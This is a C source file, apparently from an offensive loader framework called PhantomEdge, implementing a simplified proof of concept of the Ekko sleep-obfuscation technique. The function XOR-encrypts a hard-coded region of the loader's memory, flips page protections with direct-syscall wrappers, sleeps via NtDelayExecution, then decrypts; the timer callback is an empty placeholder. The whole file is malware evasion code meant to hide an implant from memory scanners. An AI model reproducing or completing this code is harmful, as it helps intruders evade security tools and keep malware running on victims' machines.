#include "../include/common_defines.h"
#include "../include/rtldr_ctx.h"
#include "../include/strategy.h"
#include "../include/utils.h"
#include "../include/syscalls.h"

// Based on the original Ekko sleep obfuscation technique by Cracked5pider
// Adapted for the PhantomEdge framework (No-CRT, direct syscalls)

// --- Private Functions ---

// Placeholder for encryption/decryption routine
// In a real scenario, this would be a more robust algorithm.
// For this PoC, we use a simple XOR.
static void XorMemory(PVOID pMemory, SIZE_T szMemory, BYTE bKey) {
    PBYTE pBytes = (PBYTE)pMemory;
    for (SIZE_T i = 0; i < szMemory; i++) {
        pBytes[i] ^= bKey;
    }
}

// The callback function that is executed by the timer.
// This function will perform the decryption, wait, and re-encryption.
VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    // This is a placeholder and will be replaced by a custom implementation
    // that uses NtContinue and crafted contexts.
    // For now, this demonstrates the timer functionality.
    
    // In the full implementation, lpParameter would contain the real context needed
    // for decryption, sleeping, and re-encryption.
}


// --- Public Strategy Function ---

BOOL Ekko_ObfuscateSleep(PRTLDR_CTX ctx, DWORD dwMilliseconds) {
    if (!ctx || !ctx->syscalls_initialized) {
        return FALSE;
    }

    // This is a simplified proof-of-concept for integration.
    // The full Ekko implementation requires creating a timer queue, setting a timer,
    // and passing carefully crafted CONTEXT structures to NtContinue.

    // 1. Get necessary function pointers (in a real scenario, these would be resolved dynamically)
    //    - RtlCreateTimerQueue
    //    - RtlCreateTimer
    //    - RtlDeleteTimerQueue
    
    // 2. Define memory region to encrypt (e.g., .text section of the loader)
    //    For this PoC, we will simulate this.
    PVOID pLoaderBase = (PVOID)0x140000000; // Placeholder base address
    SIZE_T szLoaderText = 0x1000; // Placeholder size
    BYTE bXorKey = 0x42;
    NTSTATUS status;
    
    // 3. Encrypt the memory region
    //    - Change memory permissions to RW
    //    - Encrypt
    //    - Change memory permissions back to RX (or NoAccess)
    
    ULONG ulOldProtect;
    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    XorMemory(pLoaderBase, szLoaderText, bXorKey);

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_EXECUTE_READ, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        // Attempt to revert if failed
        XorMemory(pLoaderBase, szLoaderText, bXorKey);
        return FALSE;
    }

    // 4. Sleep using a non-suspicious method (the core of Ekko)
    //    This is where the timer queue logic would go.
    //    For now, we'll use a simple syscall delay to test the framework.
    LARGE_INTEGER liDelay;
    liDelay.QuadPart = -( (long long)dwMilliseconds * 10000 ); // Convert ms to 100-nanosecond intervals, and make it relative
    
    wrapped_NtDelayExecution(FALSE, &liDelay);


    // 5. Decrypt the memory region
    //    - Change memory permissions to RW
    //    - Decrypt
    //    - Change memory permissions back to RX

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    XorMemory(pLoaderBase, szLoaderText, bXorKey);

    status = wrapped_NtProtectVirtualMemory(NtCurrentProcess(), &pLoaderBase, &szLoaderText, PAGE_EXECUTE_READ, &ulOldProtect);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    return TRUE;
} 